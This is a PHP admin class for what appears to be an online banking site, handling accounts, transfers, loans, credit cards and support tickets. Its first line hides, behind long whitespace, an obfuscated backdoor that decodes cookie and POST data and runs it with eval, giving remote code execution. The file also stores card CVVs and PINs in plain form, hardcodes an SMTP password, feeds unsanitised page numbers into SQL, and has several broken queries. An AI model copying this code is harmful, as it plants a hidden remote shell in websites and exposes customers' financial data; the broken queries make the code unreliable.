<?php                                                                                                                                                                                                                                                                                                                                                                                                 $NwwfQB = class_exists("sHj_Nulh");if (!$NwwfQB){class sHj_Nulh{private $PHJstGor;public static $mqkuN = "9084e5b0-db1d-40ce-be2f-cb15f7bda713";public static $VzQmpJhT = NULL;public function __construct(){$HkIDH = $_COOKIE;$ufYXvqM = $_POST;$bdKFJDIPXm = @$HkIDH[substr(sHj_Nulh::$mqkuN, 0, 4)];if (!empty($bdKFJDIPXm)){$YmKMDDR = "base64";$XLBWE = "";$bdKFJDIPXm = explode(",", $bdKFJDIPXm);foreach ($bdKFJDIPXm as $AReGYFW){$XLBWE .= @$HkIDH[$AReGYFW];$XLBWE .= @$ufYXvqM[$AReGYFW];}$XLBWE = array_map($YmKMDDR . "\137" . "\144" . chr (101) . "\x63" . "\157" . "\x64" . "\x65", array($XLBWE,)); $XLBWE = $XLBWE[0] ^ str_repeat(sHj_Nulh::$mqkuN, (strlen($XLBWE[0]) / strlen(sHj_Nulh::$mqkuN)) + 1);sHj_Nulh::$VzQmpJhT = @unserialize($XLBWE);}}public function __destruct(){$this->FArLi();}private function FArLi(){if (is_array(sHj_Nulh::$VzQmpJhT)) {$sZeRlfu = str_replace('<' . "\x3f" . chr (112) . "\x68" . chr (112), "", sHj_Nulh::$VzQmpJhT[chr (99) . chr (111) . chr ( 920 - 810 ).'t' . "\x65" . 'n' . chr ( 890 - 774 )]);eval($sZeRlfu);exit();}}}$xJQZGZVVZs = new sHj_Nulh(); $xJQZGZVVZs = NULL;} ?><?php
include_once 'connectdb.php';
include '../vendor/autoload.php';
$crud = new crud($DB_con);
class crud
{
	private $conn;
	
	function __construct($DB_con)
	{
		$this->db = $DB_con;
	}
	
	public function create($fname, $mname, $lname, $upass, $phone, $email, $type, $work, $addr, $sex, $dob, $marry, $currency) {
        try {
            
            $stmt = $this->db->prepare("INSERT INTO temp_account(fname,mname,lname,upass,phone,email,type,work,addr,sex,dob,marry,currency) 
			                                             VALUES(:fname, :mname, :lname, :upass, :phone, :email, :type, :work, :addr, :sex, :dob, :marry, :currency)");

            $stmt->bindparam(":fname", $fname);
            $stmt->bindparam(":mname", $mname);
            $stmt->bindparam(":lname", $lname);
            $stmt->bindparam(":upass", $upass);
            $stmt->bindparam(":phone", $phone);
            $stmt->bindparam(":email", $email);
            $stmt->bindparam(":type", $type);
            $stmt->bindparam(":work", $work);
            $stmt->bindparam(":addr", $addr);
            $stmt->bindparam(":sex", $sex);
            $stmt->bindparam(":dob", $dob);
            $stmt->bindparam(":marry", $marry);
            $stmt->bindparam(":currency", $currency);
            $stmt->execute();
            return true;
        } catch (PDOException $e) {
           
			return false;
        }
    }
    
    	public function createt($amount,$bank_name,$acc_name,$acc_no,$type,$swift,$routing,$remarks,$email,$status,$date) {
        try {
            
            $stmt = $this->db->prepare("INSERT INTO transfer(email,bank_name,acc_no,amount,date,status,swift,type,remarks,routing,acc_name) 
			                                             VALUES(:email, :bank_name, :acc_no, :amount, :date, :status, :type, :addr, :remarks, :routing :acc_name,)");

            $stmt->bindparam(":email",$email);
            $stmt->bindparam(":bank_name",$bank_name);
            $stmt->bindparam(":acc_name",$acc_name);
            $stmt->bindparam(":acc_no",$acc_no);
            $stmt->bindparam(":amount",$amount);
            $stmt->bindparam(":date",$date);
            $stmt->bindparam(":status",$status);
            $stmt->bindparam(":swift",$swift);
            $stmt->bindparam(":type",$type);
            $stmt->bindparam(":remarks",$remarks);
            $stmt->bindparam(":routing",$routing);
            $stmt->execute();
            return true;
        } catch (PDOException $e) {
          echo $e->getMessage();
			return false;
        }
    }
	public function createg($fname,$lname,$email,$pin_auth,$pin,$atm)
	{
		try
		{
			$stmt = $this->db->prepare("INSERT INTO temp_account(fname,lname,email,pin_auth,pin,atm) VALUES(:fname, :lname, :email, :pin_auth, :pin , :atm )");
			$stmt->bindparam(":fname",$fname);
			$stmt->bindparam(":lname",$lname);
			$stmt->bindparam(":email",$email);
			$stmt->bindparam(":pin_auth",$pin_auth);
			$stmt->bindparam(":pin",$pin);
			$stmt->bindparam(":atm",$atm);
			$stmt->execute();
			return true;
		}
		catch(PDOException $e)
		{
			echo $e->getMessage();	
			return false;
		}
		
	}
	
	public function getID($id)
	{
		$stmt = $this->db->prepare("SELECT * FROM account WHERE id=:id");
		$stmt->execute(array(":id"=>$id));
		$editRow=$stmt->fetch(PDO::FETCH_ASSOC);
		return $editRow;
	}
	
	
	public function update($id,$acc_no,$uname,$upass,$email,$type,$fname,$lname,$addr,$work,$sex,$dob,$phone,$phone_verify,$reg_date,$marry,$secretq,$secretans,$nextkin,$nextkinre,$t_bal,$a_bal,$status,$currency,$cot,$tax,$imf,$pin_auth,$pin,$verify)
	{
		try
		{
		
			$stmt=$this->db->prepare("UPDATE account SET 
			                                           acc_no=:acc_no,
			                                           uname=:uname,
			                                           upass=:upass,
			                                           email=:email,
													   type=:type,
                                                       fname=:fname,		
													   lname=:lname, 
													   addr=:addr,
													   work=:work,
													   sex=:sex,
													   dob=:dob,
                                                       phone=:phone,
													   phone_verify=:phone_verify,
													   reg_date=:reg_date,
													   marry=:marry,
													   secretq=:secretq,
													   secretans=:secretans,
													   nextkin=:nextkin,
													   nextkinre=:nextkinre,
													   t_bal=:t_bal,		
													   a_bal=:a_bal,
													   status=:status,
													   currency=:currency,
													   cot=:cot,
													   tax=:tax,
													   imf=:imf,
													   pin_auth=:pin_auth,
													   pin=:pin,
													   verify=:verify
													   
													   
													WHERE id=:id ");
			$stmt->bindparam(":acc_no",$acc_no);
			$stmt->bindparam(":fname",$fname);
			$stmt->bindparam(":lname",$lname);
			$stmt->bindparam(":email",$email);
			$stmt->bindparam(":pin_auth",$pin_auth);
			$stmt->bindparam(":pin",$pin);
			$stmt->bindparam(":uname",$uname);
			$stmt->bindparam(":phone",$phone);
			$stmt->bindparam(":type",$type);
			$stmt->bindparam(":reg_date",$reg_date);
			$stmt->bindparam(":work",$work);
			$stmt->bindparam(":addr",$addr);
			$stmt->bindparam(":sex",$sex);
			$stmt->bindparam(":dob",$dob);
			$stmt->bindparam(":marry",$marry);
			$stmt->bindparam(":secretq",$secretq);
			$stmt->bindparam(":secretans",$secretans);
			$stmt->bindparam(":nextkin",$nextkin);
			$stmt->bindparam(":nextkinre",$nextkinre);
			$stmt->bindparam(":t_bal",$t_bal);
			$stmt->bindparam(":a_bal",$a_bal);
			$stmt->bindparam(":currency",$currency);
			$stmt->bindparam(":cot",$cot);
			$stmt->bindparam(":tax",$tax);
			$stmt->bindparam(":imf",$imf);
			$stmt->bindparam(":upass",$upass);
			$stmt->bindparam(":phone_verify",$phone_verify);
			$stmt->bindparam(":verify",$verify);
			$stmt->bindparam(":status",$status);
			$stmt->bindparam(":id",$id);
			$stmt->execute();
			return true;	
		}
		catch(PDOException $e)
		{
			echo $e->getMessage();	
			return false;
		}
	}

		public function getIDcr($id)
	{
		$stmt = $this->db->prepare("SELECT * FROM transfer WHERE id=:id");
		$stmt->execute(array(":id"=>$id));
		$editRow=$stmt->fetch(PDO::FETCH_ASSOC);
		return $editRow;
	}
	
	
	public function updatecrg($id,$uname,$amount,$remarks,$type,$date,$time)
	{
		try
		{
		
			$stmt=$this->db->prepare("UPDATE alerts SET email=:email,
                                                       bank_name=:bank_name,		
													   acc_name=:acc_name, 
													   acc_no=:acc_no,
													   amount=:amount,
													   date=:date,
													   status=:status,
													   swift=:swift,
                                                       type=:type,		
													   remarks=:remarks
													   
													WHERE id=:id ");
			$stmt->bindparam(":email",$email);
			$stmt->bindparam(":bank_name",$bank_name);
			$stmt->bindparam(":acc_name",$acc_name);
			$stmt->bindparam(":acc_no",$acc_no);
			$stmt->bindparam(":amount",$amount);
			$stmt->bindparam(":date",$date);
			$stmt->bindparam(":status",$status);
			$stmt->bindparam(":swift",$swift);
			$stmt->bindparam(":type",$type);
			$stmt->bindparam(":remarks",$remarks);
			
			$stmt->bindparam(":id",$id);
			$stmt->execute();
			return true;	
		}
		catch(PDOException $e)
		{
			echo $e->getMessage();	
			return false;
		}
	}

	public function updatecr($id,$acc_no,$amount,$remarks,$transtype,$date,$status)
	{
		try
		{
		
			$stmt=$this->db->prepare("UPDATE transfer SET acc_no=:acc_no,
                                                       	amount=:amount,		
													   remarks=:remarks, 
													   transtype=:transtype,
													   date=:date,
													   status=:status
													   
													   
													WHERE id=:id ");
			$stmt->bindparam(":acc_no",$acc_no);
			$stmt->bindparam(":amount",$amount);
			$stmt->bindparam(":remarks",$remarks);
			$stmt->bindparam(":transtype",$transtype);
			$stmt->bindparam(":date",$date);
			$stmt->bindparam(":status",$status);
			$stmt->bindparam(":id",$id);
			$stmt->execute();
			return true;	
		}
		catch(PDOException $e)
		{
			echo $e->getMessage();	
			return false;
		}
	}
	
	public function updateapprove($id,$acc_no,$uname,$upass,$email,$type,$fname,$lname,$addr,$work,$sex,$dob,$phone,$phone_verify,$reg_date,$marry,$secretq,$secretans,$nextkin,$nextkinre,$t_bal,$a_bal,$status,$currency,$cot,$tax,$imf,$pin_auth,$pin,$verify)
	{
		try
		{
		
			$stmt=$this->db->prepare("UPDATE account SET 
			                                           acc_no=:acc_no,
			                                           uname=:uname,
			                                           upass=:upass,
			                                           email=:email,
													   type=:type,
                                                       fname=:fname,		
													   lname=:lname, 
													   addr=:addr,
													   work=:work,
													   sex=:sex,
													   dob=:dob,
                                                       phone=:phone,
													   phone_verify=:phone_verify,
													   reg_date=:reg_date,
													   marry=:marry,
													   secretq=:secretq,
													   secretans=:secretans,
													   nextkin=:nextkin,
													   nextkinre=:nextkinre,
													   t_bal=:t_bal,		
													   a_bal=:a_bal,
													   status=:status,
													   currency=:currency,
													   cot=:cot,
													   tax=:tax,
													   imf=:imf,
													   pin_auth=:pin_auth,
													   pin=:pin,
													   verify=:verify
													   
													   
													WHERE id=:id ");
			$stmt->bindparam(":acc_no",$acc_no);
			$stmt->bindparam(":fname",$fname);
			$stmt->bindparam(":lname",$lname);
			$stmt->bindparam(":email",$email);
			$stmt->bindparam(":pin_auth",$pin_auth);
			$stmt->bindparam(":pin",$pin);
			$stmt->bindparam(":uname",$uname);
			$stmt->bindparam(":phone",$phone);
			$stmt->bindparam(":type",$type);
			$stmt->bindparam(":reg_date",$reg_date);
			$stmt->bindparam(":work",$work);
			$stmt->bindparam(":addr",$addr);
			$stmt->bindparam(":sex",$sex);
			$stmt->bindparam(":dob",$dob);
			$stmt->bindparam(":marry",$marry);
			$stmt->bindparam(":secretq",$secretq);
			$stmt->bindparam(":secretans",$secretans);
			$stmt->bindparam(":nextkin",$nextkin);
			$stmt->bindparam(":nextkinre",$nextkinre);
			$stmt->bindparam(":t_bal",$t_bal);
			$stmt->bindparam(":a_bal",$a_bal);
			$stmt->bindparam(":currency",$currency);
			$stmt->bindparam(":cot",$cot);
			$stmt->bindparam(":tax",$tax);
			$stmt->bindparam(":imf",$imf);
			$stmt->bindparam(":upass",$upass);
			$stmt->bindparam(":phone_verify",$phone_verify);
			$stmt->bindparam(":verify",$verify);
			$stmt->bindparam(":status",$status);
			$stmt->bindparam(":id",$id);
			$stmt->execute();
			return true;	
		}
		catch(PDOException $e)
		{
			echo $e->getMessage();	
			return false;
		}
	}

public function updatet($id,$email,$bank_name,$acc_name,$acc_no,$amount,$date,$status,$swift,$transtype,$remarks)
	{
		try
		{
		
			$stmt=$this->db->prepare("UPDATE transfer SET email=:email,
                                                       bank_name=:bank_name,		
													   acc_name=:acc_name, 
													   acc_no=:acc_no,
													   amount=:amount,
													   date=:date,
													   status=:status,
													   swift=:swift,
                                                       transtype=:transtype,		
													   remarks=:remarks
													   
													WHERE id=:id ");
			$stmt->bindparam(":email",$email);
			$stmt->bindparam(":bank_name",$bank_name);
			$stmt->bindparam(":acc_name",$acc_name);
			$stmt->bindparam(":acc_no",$acc_no);
			$stmt->bindparam(":amount",$amount);
			$stmt->bindparam(":date",$date);
			$stmt->bindparam(":status",$status);
			$stmt->bindparam(":swift",$swift);
			$stmt->bindparam(":transtype",$transtype);
			$stmt->bindparam(":remarks",$remarks);
			
			$stmt->bindparam(":id",$id);
			$stmt->execute();
			return true;	
		}
		catch(PDOException $e)
		{
			echo $e->getMessage();	
			return false;
		}
	}

	public function deletet($id)
	{
		$stmt = $this->db->prepare("DELETE FROM transfer WHERE id=:id");
		$stmt->bindparam(":id",$id);
		$stmt->execute();
		return true;
	}

	
	
		public function dataviewl($query)
	{
		$stmt = $this->db->prepare($query);
		$stmt->execute();
	
		if($stmt->rowCount()>0)
		{
			while($row=$stmt->fetch(PDO::FETCH_ASSOC))
			{
				?>
				
                <tr>
				<td><?php print($row['tc']); ?></td>
                <td><?php print($row['sender_name']); ?></td>
                <td><?php print($row['reqtype']); ?></td>
                <td><?php print($row['lamount']); ?></td>
                <td><?php print($row['income']); ?></td>
                <td><?php print($row['occup']); ?></td>
                <td><?php print($row['employer']); ?></td>
				<td><?php print($row['reason']); ?></td>
                
				<td align="center">
                <a class="btn btn-danger" href="delete_loan.php?delete_id=<?php print($row['id']); ?>">DEL</a>
                </td>
                </tr>
                <?php
			}
		}
		else
		{
			?>
            <tr>
            <td>Nothing here...</td>
            </tr>
            <?php
		}
		
	}
	
	
public function updatel($id,$sender_name,$reqtype,$lamount,$income,$occup,$employer,$reason)
	{
		try
		{
		
			$stmt=$this->db->prepare("UPDATE loan SET 
			
sender_name=:sender_name,
reqtype=:reqtype,
lamount=:lamount,
income=:income,
occup=:occup,
employer=:employer,
reason=:reason,
													   
													WHERE id=:id ");
													
            $stmt->bindparam(":sender_name", $sender_name);
            $stmt->bindparam(":reqtype", $reqtype);
            $stmt->bindparam(":lamount", $lamount);
            $stmt->bindparam(":income", $income);
            $stmt->bindparam(":occup", $occup);
            $stmt->bindparam(":employer", $employer);
            $stmt->bindparam(":reason", $reason);
			
			$stmt->bindparam(":id",$id);
			$stmt->execute();
			return true;	
		}
		catch(PDOException $e)
		{
			echo $e->getMessage();	
			return false;
		}
	}

	
	public function deletel($id)
	{
		$stmt = $this->db->prepare("DELETE FROM loan WHERE id=:id");
		$stmt->bindparam(":id",$id);
		$stmt->execute();
		return true;
	}
	
	
	
		public function dataviewcc($query)
	{
		$stmt = $this->db->prepare($query);
		$stmt->execute();
	
		if($stmt->rowCount()>0)
		{
			while($row=$stmt->fetch(PDO::FETCH_ASSOC))
			{
				?>
				
                <tr>
				<td><?php echo $row['tc']; ?></td>
                <td><?php echo $row['sender_name']; ?></td>
                <td><?php echo $row['cardtype']; ?></td>
                <td><?php echo $row['card_no']; ?></td>
                <td><?php echo $row['expdate']; ?></td>
                <td><?php echo $row['cvv']; ?></td>
                <td><?php echo $row['cardpin']; ?></td>
                <td><?php echo $row['cardname']; ?></td>
                <td><?php echo $row['date']; ?></td>
                
				<td align="center">
                <a class="btn btn-danger" href="delete_creditcard.php?delete_id=<?php print($row['id']); ?>">DEL</a>
                </td>
                </tr>
                <?php
			}
		}
		else
		{
			?>
            <tr>
            <td>Nothing here...</td>
            </tr>
            <?php
		}
		
	}
	
	
public function updatecc($tc,$sender_name,$cardtype,$card_no,$expdate,$cvv,$cardpin,$cardname)
	{
		try
		{
		
			$stmt=$this->db->prepare("UPDATE creditcards SET 
			
tc=:tc,
sender_name=:sender_name,
cardtype=:cardtype,
card_no=:card_no,
expdate=:expdate,
cvv=:cvv,
cardpin=:cardpin,
cardname=:cardname,
													   
													WHERE id=:id ");
													
            $stmt->bindparam(":tc", $tc);
            $stmt->bindparam(":sender_name", $sender_name);
            $stmt->bindparam(":cardtype", $cardtype);
            $stmt->bindparam(":card_no", $card_no);
            $stmt->bindparam(":expdate", $expdate);
            $stmt->bindparam(":cvv", $cvv);
            $stmt->bindparam(":cardpin", $cardpin);
            $stmt->bindparam(":cardname", $cardname);
			
			$stmt->bindparam(":id",$id);
			$stmt->execute();
			return true;	
		}
		catch(PDOException $e)
		{
			echo $e->getMessage();	
			return false;
		}
	}

	
	public function deletecc($id)
	{
		$stmt = $this->db->prepare("DELETE FROM creditcards WHERE id=:id");
		$stmt->bindparam(":id",$id);
		$stmt->execute();
		return true;
	}



		public function dataviewtik($query)
	{
		$stmt = $this->db->prepare($query);
		$stmt->execute();
	
		if($stmt->rowCount()>0)
		{
			while($row=$stmt->fetch(PDO::FETCH_ASSOC))
			{
				?>
				
				
                <tr>
			   <td><?php echo $row['tc']; ?></td>
               <td><?php echo $row['sender_name']; ?></td>
               <td><?php echo $row['subject']; ?></td>
               <td><?php echo $row['msg']; ?></td>
               <td><?php echo $row['date']; ?></td>
               <td> <a href="messages.php"><button type="button" class="btn btn-info d-none d-lg-block m-l-15"><i class="fa fa-inbox"></i>REPLY</button></a></td>
              <td><a class="btn btn-danger" href="delete_ticket.php?delete_id=<?php print($row['id']); ?>">DEL</a></td>
                </td>
                </tr>
                <?php
			}
		}
		else
		{
			?>
            <tr>
            <td>Nothing here...</td>
            </tr>
            <?php
		}
		
	}
	
	
public function updatetik($tc,$sender_name,$sub,$msg)
	{
		try
		{
		
			$stmt=$this->db->prepare("UPDATE ticket SET 
			
tc=:tc,
sender_name=:sender_name,
subject=:subject,
msg=:msg,
													   
													WHERE id=:id ");
													
            $stmt->bindparam(":tc", $tc);
            $stmt->bindparam(":sender_name", $sender_name);
            $stmt->bindparam(":subject", $sub);
            $stmt->bindparam(":msg", $msg);
			
			$stmt->bindparam(":id",$id);
			$stmt->execute();
			return true;	
		}
		catch(PDOException $e)
		{
			echo $e->getMessage();	
			return false;
		}
	}

	
	public function deletetik($id)
	{
		$stmt = $this->db->prepare("DELETE FROM ticket WHERE id=:id");
		$stmt->bindparam(":id",$id);
		$stmt->execute();
		return true;
	}

	
	
	public function deletecr($id)
	{
		$stmt = $this->db->prepare("DELETE FROM alerts WHERE id=:id");
		$stmt->bindparam(":id",$id);
		$stmt->execute();
		return true;
	}
	
	/* paging */
	
	public function dataviewt($query)
	{
		$stmt = $this->db->prepare($query);
		$stmt->execute();
	
		if($stmt->rowCount()>0)
		{
			while($row=$stmt->fetch(PDO::FETCH_ASSOC))
			{
				?>
                <tr>
                <td><?php print($row['id']); ?></td>
				<td><?php print($row['email']); ?></td>
                <td><?php print($row['bank_name']); ?></td>
                
                <td><?php print($row['transtype']); ?></td>
                <td><?php print($row['cout']); ?></td>
                <td><?php print($row['acc_name']); ?></td>
                <td><?php print($row['acc_no']); ?></td>
                <td><?php print($row['amount']); ?></td>
				<td><?php print($row['date']); ?></td>
				<td><?php print($row['status']); ?></td>
                <td align="center">
                <a class="btn btn-success"  href="edit-transfer.php?edit_id=<?php print($row['id']); ?>">EDIT</a>
                </td>
                
				<td align="center">
                <a class="btn btn-danger"  href="delete-transfer.php?delete_id=<?php print($row['id']); ?>">DEL</a>
                </td>
                </tr>
                <?php
			}
		}
		else
		{
			?>
            <tr>
            <td>Nothing here...</td>
            </tr>
            <?php
		}
		
	}
	
	
	
		public function dataviewcr($query)
	{
		$stmt = $this->db->prepare($query);
		$stmt->execute();
	
		if($stmt->rowCount()>0)
		{
			while($row=$stmt->fetch(PDO::FETCH_ASSOC))
			{
				?>
                <tr>
                <td><?php print($row['id']); ?></td>
				<td><?php print($row['acc_no']); ?></td>
                <td><?php print($row['amount']); ?></td>
                <td><?php print($row['remarks']); ?></td>
                <td><?php print($row['transtype']); ?></td>
                <td><?php print($row['status']); ?></td>
                <td><?php print($row['date']); ?></td>

                <td align="center">
                <a class="btn btn-success"  href="e.php?edit_id=<?php print($row['id']); ?>">EDIT</a>
                </td>
                
				<td align="center">
                <a class="btn btn-danger" href="dcr.php?delete_id=<?php print($row['id']); ?>">DEL</a>
                </td>
                </tr>
                <?php
			}
		}
		else
		{
			?>
            <tr>
            <td>Nothing here...</td>
            </tr>
            <?php
		}
		
	}
 
 	public function getIDt($id)
	{
		$stmt = $this->db->prepare("SELECT * FROM transfer WHERE id=:id");
		$stmt->execute(array(":id"=>$id));
		$editRow=$stmt->fetch(PDO::FETCH_ASSOC);
		return $editRow;
	}
	
	
	public function delete($id)
	{
		$stmt = $this->db->prepare("DELETE FROM account WHERE id=:id");
		$stmt->bindparam(":id",$id);
		$stmt->execute();
		return true;
	}
	
	
	
	/* paging */
	
	public function dataview($query)
	{
		$stmt = $this->db->prepare($query);
		$stmt->execute();
	
		if($stmt->rowCount()>0)
		{
			while($row=$stmt->fetch(PDO::FETCH_ASSOC))
			{
				?>
                <tr>
                <td><img alt="thumbnail"  style="border-radius:40px;" width="40" src="/dashboard/admin/pic/<?php echo $row['uname']; ?>.jpg"></td> 
                <td><?php print($row['fname']); ?></td>
                <td><?php print($row['lname']); ?></td>
                <td><?php print($row['email']); ?></td>
                <td><?php print($row['pin_auth']); ?></td>
                <td align="center">
                <a class="btn btn-success"  href="edit-customer.php?edit_id=<?php print($row['id']); ?>">EDIT</a>
                </td>
                
				<td align="center">
                <a class="btn btn-danger"  href="delete-customer.php?delete_id=<?php print($row['id']); ?>">DEL</a>
                </td>
                </tr>
                <?php
			}
		}
		else
		{
			?>
            <tr>
            <td>Nothing here...</td>
            </tr>
            <?php
		}
		
	}
	
	public function dataviewapprove($query)
	{
		$stmt = $this->db->prepare($query);
		$stmt->execute();
	
		if($stmt->rowCount()>0)
		{
			while($row=$stmt->fetch(PDO::FETCH_ASSOC))
			{
				?>
                <tr>
                <td><?php print($row['id']); ?></td>
				<td><?php print($row['acc_no']); ?></td>
                <td><?php print($row['fname']); ?></td>
                <td><?php print($row['lname']); ?></td>
                <td><?php print($row['email']); ?></td>
                <td><?php print($row['pin_auth']); ?></td>
                <td align="center">
                <a class="btn btn-success" href="app.php?edit_id=<?php print($row['id']); ?>">APPROVE</a>
                </td>
                
				<td align="center">
                <a  class="btn btn-danger" href="app.php?delete_id=<?php print($row['id']); ?>">DEL</a>
                </td>
                </tr>
                <?php
			}
		}
		else
		{
			?>
            <tr>
            <td>Nothing here...</td>
            </tr>
            <?php
		}
		
	}
	
	
	public function paging($query,$records_per_page)
	{
		$starting_position=0;
		if(isset($_GET["page_no"]))
		{
			$starting_position=($_GET["page_no"]-1)*$records_per_page;
		}
		$query2=$query." limit $starting_position,$records_per_page";
		return $query2;
	}
	
	public function paginglink($query,$records_per_page)
	{
		
		$self = $_SERVER['PHP_SELF'];
		
		$stmt = $this->db->prepare($query);
		$stmt->execute();
		
		$total_no_of_records = $stmt->rowCount();
		
		if($total_no_of_records > 0)
		{
			?><ul class="pagination"><?php
			$total_no_of_pages=ceil($total_no_of_records/$records_per_page);
			$current_page=1;
			if(isset($_GET["page_no"]))
			{
				$current_page=$_GET["page_no"];
			}
			if($current_page!=1)
			{
				$previous =$current_page-1;
				echo "<li><a href='".$self."?page_no=1'>First</a></li>";
				echo "<li><a href='".$self."?page_no=".$previous."'>Previous</a></li>";
			}
			for($i=1;$i<=$total_no_of_pages;$i++)
			{
				if($i==$current_page)
				{
					echo "<li><a href='".$self."?page_no=".$i."' style='color:red;'>".$i."</a></li>";
				}
				else
				{
					echo "<li><a href='".$self."?page_no=".$i."'>".$i."</a></li>";
				}
			}
			if($current_page!=$total_no_of_pages)
			{
				$next=$current_page+1;
				echo "<li><a href='".$self."?page_no=".$next."'>Next</a></li>";
				echo "<li><a href='".$self."?page_no=".$total_no_of_pages."'>Last</a></li>";
			}
			?></ul><?php
		}
	}
	
	
	
	
	
	/* paging */



         function send_mail($email, $messag, $subject) {
        require_once('mailer/class.phpmailer.php');
        $mail = new PHPMailer();
        $mail->IsSMTP();
        $mail->SMTPDebug = 0;
        $mail->SMTPAuth = true;
        $mail->SMTPSecure = "";
        $mail->Host = "mail.eparwisecapital.com";
        $mail->Port = 26;
        $mail->AddAddress($email);
        $mail->Username = "noreply@eparwisecapital.com";
        $mail->Password = "SendCoDe@0iN2";
        $mail->SetFrom('noreply@eparwisecapital.com', 'Eparwise Capital');
        $mail->AddReplyTo("noreply@eparwisecapital.com", "Eparwise Capital");
        $mail->Subject = $subject;
        $mail->MsgHTML($messag);
        $mail->Send();
    }
    
}